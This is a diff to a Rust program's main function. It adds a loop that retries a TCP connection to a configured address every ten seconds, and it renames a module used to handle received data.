@@ -1,10 +1,21 @@
-use std::{io::Read, net::TcpStream};
+use std::{fmt::Debug, io::Read, net::TcpStream};
 
-mod commands;
+mod networking;
 mod utils;
 
-fn main() {
-    let mut stream = TcpStream::connect(format!("{ADDRESS}:{PORT}")).expect("failed to connect");
+fn main()
+{
+    let mut streamResult: Result<TcpStream, std::io::Error>;
+    loop
+    {
+        streamResult = TcpStream::connect(format!("{ADDRESS}:{PORT}"));
+        if !streamResult.is_err()
+        {
+            break;
+        }
+        std::thread::sleep(std::time::Duration::from_secs(10));
+    }
+    let mut stream = streamResult.unwrap();
     loop {
         let mut buffer: Vec<u8> = Vec::new();
         loop 
@@ -17,7 +28,7 @@ fn main() {
                 break;
             }
         }
-        commands::command_serializer::receive_data(&mut stream, buffer);
+        networking::serialization::receive_data(&mut stream, buffer);
     }
 }
 
